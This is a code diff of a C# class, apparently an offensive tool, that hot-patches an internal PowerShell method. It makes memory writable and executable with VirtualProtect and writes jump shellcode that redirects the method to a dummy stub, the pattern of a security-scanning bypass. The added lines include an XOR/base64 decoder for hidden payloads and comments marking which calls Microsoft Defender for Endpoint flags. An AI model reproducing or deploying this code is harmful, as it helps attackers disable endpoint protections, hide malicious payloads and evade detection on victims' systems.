@@ -2,12 +2,31 @@
 using System.ComponentModel;
 using System.Management.Automation;
 using System.Reflection;
+using System.Collections.Generic;
 using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
 using System.Text;
 
 namespace Editor {
     public static class Methods {
+
+        private static string keyX = "aW5jb25jZWl2YWJsZQ=="; //inconceivable
+        private static byte[] XOR(string b64blob, string key)
+        {
+
+            List<byte> output1 = new List<byte>();
+
+            byte[] decoded = Convert.FromBase64String(b64blob);
+            byte[] dkey = Convert.FromBase64String(key);
+
+            for (int i = 0; i < decoded.Length; i++)
+            {
+                output1.Add((byte)(decoded[i] ^ dkey[i % dkey.Length]));
+            }
+
+            return output1.ToArray();
+        }
+
         public static void Patch() {
             MethodInfo original = typeof(PSObject).Assembly.GetType(Methods.CLASS).GetMethod(Methods.METHOD, BindingFlags.NonPublic | BindingFlags.Static);
             MethodInfo replacement = typeof(Methods).GetMethod("Dummy", BindingFlags.NonPublic | BindingFlags.Static);
@@ -31,7 +50,7 @@ namespace Editor {
             //Generate architecture specific shellcode
             byte[] patch = null;
             if (IntPtr.Size == 8) {
-                patch = new byte[] { 0x49, 0xbb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xff, 0xe3 };
+                patch = new byte[] { 0x49, 0xbb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xff, 0xe3 };  //MDSE  gl\
                 byte[] address = BitConverter.GetBytes(replacementSite.ToInt64());
                 for (int i = 0; i < address.Length; i++) {
                     patch[i + 2] = address[i];
@@ -46,7 +65,7 @@ namespace Editor {
 
             //Temporarily change permissions to RWE
             uint oldprotect;
-            if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, 0x40, out oldprotect)) {
+            if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, 0x40, out oldprotect)) { //MDE may flag on this
                 throw new Win32Exception();
             }
 
@@ -83,7 +102,7 @@ namespace Editor {
         private static extern IntPtr GetCurrentProcess();
 
         [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); //MDE flags this
 
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
